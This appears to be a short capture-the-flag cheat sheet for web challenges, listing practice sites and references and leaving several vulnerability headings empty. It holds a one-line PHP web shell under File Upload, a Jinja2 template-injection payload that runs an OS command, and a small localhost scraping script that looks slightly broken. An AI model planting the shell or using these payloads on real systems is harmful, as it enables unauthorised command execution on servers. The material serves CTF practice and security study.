## ► web

★ Best resources for web:
- https://portswigger.net/
- https://cheatsheetseries.owasp.org/

### Initial checks
- robots.txt
- git dumpster
- directory bruteforce

### Time wasters
- https://overthewire.org/wargames/natas/
- http://www.itsecgames.com/
- https://ctf.hacker101.com/
- https://www.hackthissite.org/
- http://www.dvwa.co.uk/

### SQL Injection
- https://github.com/Audi-1/sqli-labs/
- https://portswigger.net/web-security/sql-injection/cheat-sheet

### XSS
- http://xss-game.appspot.com/
- https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
### XXE
### Path Traversal
### PHP deserealization
### File Upload


#### Basic PHP shell

``` <?php echo system($_GET['c']); ?> ```

### Local File Inclusion

### Scraping things from web-pages

```
import requests
import re

url = "http://127.0.0.1"
s = requests.Session()

data = {"querybyte":"A","auth":69}
r = s.post(url,data)

gold = re.findall("Auth code: (\.\*)", r)[0]
print gold

```

### Server Side Template Injection

```{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}``` ```pico18/flaskcards```
<https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection>
